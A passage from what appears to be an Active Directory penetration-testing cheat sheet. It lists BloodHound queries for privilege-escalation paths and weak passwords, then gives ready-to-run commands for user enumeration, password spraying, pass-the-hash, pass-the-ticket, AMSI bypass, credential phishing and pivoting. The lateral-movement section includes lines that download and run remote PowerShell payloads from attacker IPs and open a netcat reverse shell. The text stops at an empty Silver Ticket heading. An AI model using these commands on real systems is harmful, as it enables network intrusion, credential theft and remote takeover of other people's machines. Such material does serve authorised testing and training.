            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)-[r:AdminTo]->(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH m, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)<-[r:AdminTo]-(n) RETURN m",
                "allowCollapse": true
            }]
        },
        {
            "name": "(Warning: edits the DB) Mark Top Ten Computers with Most Admins as HVT",
            "category": "Not at the table Carlos!",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)-[r:AdminTo]->(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH m, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)<-[r:AdminTo]-(n) SET m.highvalue = true RETURN m",
                "allowCollapse": true
            }]
        },
                {
            "name": "Top 20 nodes with most first degree object controls",
            "category": "Not at the table Carlos!",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(u)-[r1]->(n) WHERE r1.isacl = true WITH u, count(r1) AS count_ctrl ORDER BY count_ctrl DESC LIMIT 20 RETURN u",
                "allowCollapse": true
            }]
        },
                {
            "name": "Top ten nodes with most group delegated object controls",
            "category": "Not at the table Carlos!",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(u)-[r1:MemberOf*1..]->(g:Group)-[r2]->(n) WHERE r2.isacl=true WITH u, count(r2) AS count_ctrl ORDER BY count_ctrl DESC LIMIT 20 RETURN u",
                "allowCollapse": true
            }]
        },
        {
            "name": "Find machines Domain Users can RDP into",
            "category": "We can’t find Doug",
            "queryList": [{
                "final": true,
                "query": "match p=(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS WITH '-513' return p"
            }]
        },
        {
            "name": "Find Servers Domain Users can RDP To",
            "category": "We can’t find Doug",
            "queryList": [{
                "final": true,
                "query": "match p=(g:Group)-[:CanRDP]->(c:Computer) where g.name STARTS WITH 'DOMAIN USERS' AND c.operatingsystem CONTAINS 'Server' return p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Find what groups can RDP",
            "category": "We can’t find Doug",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:Group)-[r:CanRDP]->(n:Computer) RETURN p"
            }]
        },
        {
            "name": "Return All Azure Users that are part of the ‘Global Administrator’ Role",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p"
            }]
        },
        {
            "name": "Return All On-Prem users with edges to Azure",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH  p=(m:User)-[r:AZResetPassword|AZOwns|AZUserAccessAdministrator|AZContributor|AZAddMembers|AZGlobalAdmin|AZVMContributor|AZOwnsAZAvereContributor]->(n) WHERE m.objectid CONTAINS 'S-1-5-21' RETURN p"
            }]
        },
        {
            "name": "Find all paths to an Azure VM",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH p = (n)-[r]->(g:AZVM) RETURN p"
            }]
        },
        {
            "name": "Find all paths to an Azure KeyVault",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p"
            }]
        },
        {
            "name": "Return All Azure Users and their Groups",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:AZUser)-[r:MemberOf]->(n) WHERE NOT m.objectid CONTAINS 'S-1-5' RETURN p"
            }]
        },
        {
            "name": "Return All Azure AD Groups that are synchronized with On-Premise AD",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:Group) WHERE n.objectid CONTAINS 'S-1-5' AND n.azsyncid IS NOT NULL RETURN n"
            }]
        },
        {
            "name": "Find all Privileged Service Principals",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH p = (g:AZServicePrincipal)-[r]->(n) RETURN p"
            }]
        },
        {
            "name": "Find all Owners of Azure Applications",
            "category": "It's called a satchel",
            "queryList": [{
                "final": true,
                "query": "MATCH p = (n)-[r:AZOwns]->(g:AZApp) RETURN p"
            }]
        },
        {
            "name": "Find all Certificate Templates",
            "category": "Certificates",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' RETURN n"
            }]
        },
        {
            "name": "Find enabled Certificate Templates",
            "category": "Certificates",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.Enabled = true RETURN n"
            }]
        },
        {
            "name": "Find Certificate Authorities",
            "category": "Certificates",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' RETURN n"
            }]
        },
        {
            "name": "Show Enrollment Rights for Certificate Template",
            "category": "Certificates",
            "queryList": [{
                "final": false,
                "title": "Select a Certificate Template...",
                "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' RETURN n.name"
              },
              {
                "final": true,
                "query": "MATCH p=(g)-[:Enroll|AutoEnroll]->(n:GPO {name:$result}) WHERE n.type = 'Certificate Template' return p",
                "allowCollapse": false
            }]
        },
        {
            "name": "Show Rights for Certificate Authority",
            "category": "Certificates",
            "queryList": [{
                "final": false,
                "title": "Select a Certificate Authority...",
                "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' RETURN n.name"
              },
              {
                "final": true,
                "query": "MATCH p=(g)-[:ManageCa|ManageCertificates|Auditor|Operator|Read|Enroll]->(n:GPO {name:$result}) return p",
                "allowCollapse": false
            }]
        },
        {
            "name": "Find Misconfigured Certificate Templates (ESC1)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.`Enrollee Supplies Subject` = true and n.`Client Authentication` = true and n.`Enabled` = true  RETURN n"
            }]
        },
        {
            "name": "Shortest Paths to Misconfigured Certificate Templates from Owned Principals (ESC1)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enrollee Supplies Subject` = true and n.`Client Authentication` = true and n.`Enabled` = true return p"
            }]
        },
        {
            "name": "Find Misconfigured Certificate Templates (ESC2)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage`)  RETURN n"
            }]
        },
        {
            "name": "Shortest Paths to Misconfigured Certificate Templates from Owned Principals (ESC2)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage`) return p"
            }]
        },
        {
            "name": "Find Enrollment Agent Templates (ESC3)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage` or 'Certificate Request Agent' IN n.`Extended Key Usage`)  RETURN n"
            }]
        },
        {
            "name": "Shortest Paths to Enrollment Agent Templates from Owned Principals (ESC3)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage` or 'Certificate Request Agent' IN n.`Extended Key Usage`) return p"
            }]
        },
        {
            "name": "Shortest Paths to Vulnerable Certificate Template Access Control (ESC4)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=shortestPath((g)-[:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enabled` = true RETURN p"
            }]
        },
        {
            "name": "Shortest Paths to Vulnerable Certificate Template Access Control from Owned Principals (ESC4)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=allShortestPaths((g {owned:true})-[r*1..]->(n:GPO)) WHERE g<>n and n.type = 'Certificate Template' and n.Enabled = true and NONE(x in relationships(p) WHERE type(x) = 'Enroll' or type(x) = 'AutoEnroll') return p"
            }]
        },
        {
            "name": "Find Certificate Authorities with User Specified SAN (ESC6)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' and n.`User Specified SAN` = 'Enabled' RETURN n"
            }]
        },
        {
            "name": "Shortest Paths to Vulnerable Certificate Authority Access Control (ESC7)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=shortestPath((g)-[r:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ManageCa|ManageCertificates*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Enrollment Service' RETURN p"
            }]
        },
        {
            "name": "Shortest Paths to Vulnerable Certificate Authority Access Control from Owned Principals (ESC7)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Enrollment Service' and NONE(x in relationships(p) WHERE type(x) = 'Enroll' or type(x) = 'AutoEnroll') RETURN p"
            }]
        },
        {
            "name": "Find Certificate Authorities with HTTP Web Enrollment (ESC8)",
            "category": "AD CS Domain Escalation",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' and n.`Web Enrollment` = 'Enabled' RETURN n"
            }]
        },
        {
			"name": "Find users that can RDP into something",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "match (u1:User) WHERE u1.plaintext=True MATCH p1=(u1)-[:CanRDP*1..]->(c:Computer) RETURN u1",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Find users that belong to high value groups",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "match (u1:User) WHERE u1.plaintext=True MATCH p=(u1:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN u1",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Find kerberoastable users",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "match (u1:User) WHERE u1.plaintext=True AND u1.hasspn=True RETURN u1",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Return users with seasons in their password and are high value targets",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "MATCH (u1:User) WHERE u1.plaintextpassword =~ \"([Ww]inter.*|[sS]pring.*|[sS]ummer.*|[fF]all.*)\" MATCH p=(u1:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN u1",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Return users with seasons in their password and have local admin on at least one computer",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "match (u1:User) WHERE u1.plaintextpassword =~ \"([Ww]inter.*|[sS]pring.*|[sS]ummer.*|[fF]all.*)\" match p=(u1:User)-[r:AdminTo]->(n:Computer) RETURN p",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Return users with seasons in their password and a path to high value targets (limit to 25 results)",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "match (u1:User) WHERE u1.plaintextpassword =~ \"([Ww]inter.*|[sS]pring.*|[sS]ummer.*|[fF]all.*)\" MATCH p=shortestPath((u1:User)-[*1..]->(n {highvalue:true})) WHERE  u1<>n return u1 LIMIT 25",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Return users with a variant of \"password\" in their password and are high value targets",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "MATCH (u1:User) WHERE u1.plaintextpassword =~ \"(.*[pP][aA@][sS$][sS$][wW][oO0][rR][dD].*)\" MATCH p=(u1:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN u1",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Return users with a variant of \"password\" in their password and have local admin on at least one computer",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "match (u1:User) WHERE u1.plaintextpassword =~ \"(.*[pP][aA@][sS$][sS$][wW][oO0][rR][dD].*)\" match p=(u1:User)-[r:AdminTo]->(n:Computer) RETURN p",
					"allowCollapse": true
				}
			]
		},
		{
			"name": "Return users with a variant of \"password\" in their password and a path to high value targets (limit to 25 results)",
			"category": "PlainText Password Queries",
			"queryList": [
				{
					"final": true,
					"query": "match (u1:User) WHERE u1.plaintextpassword =~ \"(.*[pP][aA@][sS$][sS$][wW][oO0][rR][dD].*)\"  MATCH p=shortestPath((u1:User)-[*1..]->(n {highvalue:true})) WHERE  u1<>n return u1 LIMIT 25",
					"allowCollapse": true
				}
			]
		}
    ]
}
            
```
</details>

#### Active Directory Certificate Services

**Imports**

<details>
<summary> Click me for the JSON</summary>

```json=

{
  "queries": [
    {
      "name": "Find all Certificate Templates",
      "category": "Certificates",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' RETURN n"
        }
      ]
    },
    {
      "name": "Find enabled Certificate Templates",
      "category": "Certificates",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.Enabled = true RETURN n"
        }
      ]
    },
    {
      "name": "Find Certificate Authorities",
      "category": "Certificates",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' RETURN n"
        }
      ]
    },
    {
      "name": "Show Enrollment Rights for Certificate Template",
      "category": "Certificates",
      "queryList": [
        {
          "final": false,
          "title": "Select a Certificate Template...",
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' RETURN n.name"
        },
        {
          "final": true,
          "query": "MATCH p=(g)-[:Enroll|AutoEnroll]->(n:GPO {name:$result}) WHERE n.type = 'Certificate Template' return p",
          "allowCollapse": false
        }
      ]
    },
    {
      "name": "Show Rights for Certificate Authority",
      "category": "Certificates",
      "queryList": [
        {
          "final": false,
          "title": "Select a Certificate Authority...",
          "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' RETURN n.name"
        },
        {
          "final": true,
          "query": "MATCH p=(g)-[:ManageCa|ManageCertificates|Auditor|Operator|Read|Enroll]->(n:GPO {name:$result}) return p",
          "allowCollapse": false
        }
      ]
    },
    {
      "name": "Find Misconfigured Certificate Templates (ESC1)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.`Enrollee Supplies Subject` = true and n.`Client Authentication` = true and n.`Enabled` = true  RETURN n"
        }
      ]
    },
    {
      "name": "Shortest Paths to Misconfigured Certificate Templates from Owned Principals (ESC1)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enrollee Supplies Subject` = true and n.`Client Authentication` = true and n.`Enabled` = true return p"
        }
      ]
    },
    {
      "name": "Find Misconfigured Certificate Templates (ESC2)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage` or n.`Any Purpose` = True) RETURN n"
        }
      ]
    },
    {
      "name": "Shortest Paths to Misconfigured Certificate Templates from Owned Principals (ESC2)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage` or n.`Any Purpose` = True) RETURN p"
        }
      ]
    },
    {
      "name": "Find Enrollment Agent Templates (ESC3)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage` or 'Certificate Request Agent' IN n.`Extended Key Usage` or n.`Any Purpose` = True) RETURN n"
        }
      ]
    },
    {
      "name": "Shortest Paths to Enrollment Agent Templates from Owned Principals (ESC3)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enabled` = true and (n.`Extended Key Usage` = [] or 'Any Purpose' IN n.`Extended Key Usage` or n.`Any Purpose` = True or 'Certificate Request Agent' IN n.`Extended Key Usage`) RETURN p"
        }
      ]
    },
    {
      "name": "Shortest Paths to Vulnerable Certificate Template Access Control (ESC4)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=shortestPath((g)-[:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Certificate Template' and n.`Enabled` = true RETURN p"
        }
      ]
    },
    {
      "name": "Shortest Paths to Vulnerable Certificate Template Access Control from Owned Principals (ESC4)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=allShortestPaths((g {owned:true})-[r*1..]->(n:GPO)) WHERE g<>n and n.type = 'Certificate Template' and n.Enabled = true and NONE(x in relationships(p) WHERE type(x) = 'Enroll' or type(x) = 'AutoEnroll') return p"
        }
      ]
    },
    {
      "name": "Find Certificate Authorities with User Specified SAN (ESC6)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' and n.`User Specified SAN` = 'Enabled' RETURN n"
        }
      ]
    },
    {
      "name": "Shortest Paths to Vulnerable Certificate Authority Access Control (ESC7)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=shortestPath((g)-[r:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ManageCa|ManageCertificates*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Enrollment Service' RETURN p"
        }
      ]
    },
    {
      "name": "Shortest Paths to Vulnerable Certificate Authority Access Control from Owned Principals (ESC7)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=allShortestPaths((g {owned:true})-[*1..]->(n:GPO)) WHERE  g<>n and n.type = 'Enrollment Service' and NONE(x in relationships(p) WHERE type(x) = 'Enroll' or type(x) = 'AutoEnroll') RETURN p"
        }
      ]
    },
    {
      "name": "Find Certificate Authorities with HTTP Web Enrollment (ESC8)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Enrollment Service' and n.`Web Enrollment` = 'Enabled' RETURN n"
        }
      ]
    },
    {
      "name": "Find Unsecured Certificate Templates (ESC9)",
      "category": "Domain Escalation",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.`Enrollee Supplies Subject` = true and n.`Client Authentication` = true and n.`Enabled` = true  RETURN n"
        }
      ]
    },
    {
      "name": "Find Unsecured Certificate Templates (ESC9)",
      "category": "PKI",
      "queryList": [
        {
          "final": true,
          "query": "MATCH (n:GPO) WHERE n.type = 'Certificate Template' and 'NoSecurityExtension' in n.`Enrollment Flag` and n.`Enabled` = true  RETURN n"
        }
      ]
    },
    {
      "name": "Shortest Paths to Unsecured Certificate Templates from Owned Principals (ESC9)",
      "category": "PKI",
      "queryList": [
        {
          "final": true,
          "query": "MATCH p=allShortestPaths((g {owned:true})-[r*1..]->(n:GPO)) WHERE n.type = 'Certificate Template' and g<>n and 'NoSecurityExtension' in n.`Enrollment Flag` and n.`Enabled` = true and NONE(rel in r WHERE type(rel) in ['EnabledBy','Read','ManageCa','ManageCertificates']) return p"
        }
      ]
    }
  ]
}
```

</details>


### Azure

## Kerberos User Enumeration

### Brute forcing users

Gather a list of potential usernames and put into usernames.txt
```bash
kerbrute userenum -d [DOMAIN FQDN] --dc [DCHOSTNAME] usernames.txt
```
### Password Spraying
```bash
# See Enumeration or AS-REP Roasting to get domainusers.txt or make your own
kerbrute passwordspray -d [DOMAIN FQDN] domainusers.txt Password123
```


## Active Directory Lateral Movement


### Pass the Hash
A Pass the Hash (PTH) comes in many forms. From CrackMapExec, to RPC, to xfreerdp. 
This type of attack is simply using the NTLM hash of a domain account for authentication, rather than a password.

#### CrackMapExec (CME)
Doing a PTH with cme is quite easy. 
You enter the varying fields you want but instead of supplying a password, you supply a hash instead.
```bash
cme smb 192.168.0.0/24 -u Administrator -H [...snip...] 
```

#### Evil-WinRM
Evil-WinRM is an immensely powerful tool. It offers authentication both using credentials as well as hashes.

In order for this tool to work, even with valid credentials, the Windows Remote Management service has to be running and your user has to have valid permissions. (they usually do)

To identify if the service is running you can look for the ports `5985` (HTTP) and `5956` (HTTPS) open on a windows host. 

```bash
# Installation
gem install evil-winrm

# General Usage
Evil-WinRM -i 0.0.0.0 -u Administrator -p 'password'

# PTH Usage
Evil-WinRM -i 0.0.0.0 -u Administrator -H [... hash ...]
```

Additionally you can have Evil-WinRM preload dotnet binaries as well as powershell scripts
```bash
Evil-Winrm -i 0.0.0.0 -u user -p pass -s /opt/powershellscripts/ -e /opt/binaries/
```

In-shell menu
```powershell
# will display tools or scripts available
menu

# execute binary from preloaded path (-e) 
Invoke-Binary /opt/binaries/binary.exe 

# you can hit TAB a few times to display the powershell scripts loaded with -s
<tab>
Invoke-PowerView.ps1 
# menu -> to display functions from loaded powershell script and call on them to run them.
Get-ADDomain -Domain domain.local

# tool to try to bypass amsi
Bypass-4MSI

# upload
upload /path/to/file

# download
download C:\path\to\file

# load dll (does  [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("selected.dll")) )
Dll-Loader /path/to/dll

# list out services that could be potentially vulnerable
services

# to directly run a donut created .bin file. see the donut section in AV evasion to generate payload
Donut-Loader -process_id (get-process msedge.exe).id -donutfile /path/to/donut-payload.bin
```


Some additional flags that could be useful.
| Flag | Description | 
| ---- | ---- |
| -S | use ssl | 
| -r | specify relm/domain |
| -n | disabled colors in the terminal |
| -l | enables logging | 
| -p | specify port |
| -U | specify url on the target machine (useful if target manually changed it, rare to happen) |

### Overpass-the-Hash

Rubeus

```powershell
Rubeus.exe ptt /ticket:<b64ticket>
Rubeus.exe ptt /user:USER /pass:PASS
Rubeus.exe ptt /user:USER /rc4:ntlmhash
Rubeus.exe ptt /user:USER /aes256:hash 
```


### Pass-the-Ticket


Tip: convert ticket to UNIX <-> Windows format
```bash

# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```

Step 1: Inject Ticket (If you already have ticket, skip to next step)

Windows

```powershell
# Rubeus 
Rubeus.exe ptt /ticket:"base64 | ticket.kirbi"

# Mimikatz
# use a .kirbi file
kerberos::ptt $ticket_kirbi_file

# use a .ccache file
kerberos::ptt $ticket_ccache_file
```

Linux
```bash
# export the ticket to the enviornment variable so that tools can utilize it.
export KRB5CCNAME=/full/path/to/ticket.ccache
```

Step 2: "Pass" the ticket

Tools can utilize the -k flag to specify a kerberos ticket/authentication. 
This uses the KRB5CCNAME enviornment variable set above. 
To use a different ticket, simply re-export a different ticket.

Some Examples:

Linux:
```bash
# try with -no-pass if you encounter errors
psexec.py -k 'DOMAIN/USER@TARGET'
wmiexec.py -k 'DOMAIN/USER@TARGET'
crackmapexec smb 0.0.0.0 --use-kcache
crackmapexec winrm 0.0.0.0 --use-kcache

lsassy -k $TARGETS
secretsdump.py -k 'DOMAIN/USER@TARGET'
```

Windows:
```powershell
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi

#List tickets in cache to cehck that mimikatz has loaded the ticket
klist

.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

### RDP 

Enable RDP for admin accounts
```bash
enableRDP='reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
cme smb [snip] -x '$enableRDP' 

cme smb [snip] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

```bash
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:USER /pth:<NTLMHash> /v:HOST 

xfreerdp /d: /u: /pth:HASH /v:HOST /cert-ignore -dynamic-resolution /drive:Verified,/path/to/Verified /timeout:60000
```

### RPC

```bash
python scshell.py 'DOMAIN'/'USER'@192.168.1.11 -hashes :[...hash...] -service-name lfsvc

SCShell> C:\windows\system32\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://10.10.13.37:8080/payload.ps1')
```

### RunAs

```powershell
# CMD
runas /u:user powershell.exe

# PowerShell
$cred = New-Object System.Management.Automation.PSCredential('<HOSTNAME>\<USERNAME>', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
$computer = "PC01"

# Process.Start
[System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c ping -n 1 10.10.13.37", $cred.Username, $cred.Password, $computer)

# Start-Process
Start-Process -FilePath "C:\Windows\System32\cmd.exe" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred

# Invoke-Command
Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred

$s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
Invoke-Command -ScriptBlock { whoami } -Session $s
```

### SMB 
```bash
psexec.py 'domain'/'user':'Passw0rd!'@192.168.11.1
rlwrap -cAr psexec.py -hashes :[... hash ...] 'domain'/'user'@192.168.11.1 powershell
```

### SPN-Jacking

### PSRemoting
Windows
```powershell
# PowerShell Remoting
$SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\targetuser', $SecPassword)

# Run a command remotely (can be used on multiple machines at once)
Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami;hostname;Get-Process -IncludeUserName}

#To many computers
Invoke-Command -Credential $cred -ComputerName (Get-Content ./listServers.txt)

#Execute scripts from files
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

#Execute locally loaded function on the remote machines
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList

#Bypass AMSI & Execute C2
Invoke-Command -ScriptBlock {powershell.exe -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/AMSIBypass.ps1');iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/evil.ps1')"} -ComputerName dc.targetdomain.com
```

```powershell
winrs -r:pc.fqdn.local whoami;hostname
```

```powershell
$sess = New-PSSession -ComputerName 192.168.11.1 -Credential $cred -Authentication Negotiate
Enter-PSSession -Session $sess
```

Identify PSRemoting access availble to current user
```powershell
Import-Module Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
### WMI 

Windows

```powershell
# Check Access
Get-WmiObject -Credential $cred -ComputerName PC01 -Namespace "root" -class "__Namespace" | Select Name

# Execute Commands
Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("powershell (New-Object Net.WebClient).DownloadFile('http://10.10.13.37/nc.exe', 'C:\Users\bob\music\nc.exe')")
Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("C:\Users\bob\music\nc.exe 10.10.13.37 1337 -e powershell")
```

Linux

```bash
# Typical Usage
wmiexec.py 'domain'/'user':'Passw0rd!'@192.168.1.11
wmiexec.py -hashes :[... hash ...] 'domain'/'user'@192.168.1.11


# Reverse Shell
sudo python3 -m http.server 80
sudo rlwrap nc -lvnp 443
wmiexec.py -silentcommand -nooutput snovvcrash:'Passw0rd!'@192.168.1.11 'powershell iEx (iWr "http://10.10.13.37/rev.ps1")'
```


If RPC and SMB are blocked check with WMI
```powershell
Import-Module Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```


### Phishing with Metasploit
Using Metasploit we can leverage a phishing module to harvest user credentials by harassing them until they enter valid credentials.
```bash
msf6> use post/windows/gather/phish_windows_credentials
msf6> set session 1
msf6> run
```

## Pivoting

### Metasploit
```
msfconsole
> search autoroute
> use 0
> set session $
> run

> search socks
> use 0
> set srvport 9050
> run

$ proxychains -q cme smb .........
```

### Ligolo
Linux Host 
```bash
ip tuntap add user root mode tun ligolo
ip link set ligolo up
ip route add 192.168.110.0/24 dev ligolo
./proxy -laddr 0.0.0.0:53 -selfcert
```

Linux Target
```bash
# upload compiled agent
./agent -connect x.x.x.x:53 -ignore-cert &
```

Windows Target
```cmd
.\agent.exe -connect x.x.x.x:53 -ignore-cert
```

## Active Directory Persistence

### Silver Ticket
```bash
# Get Domain SID
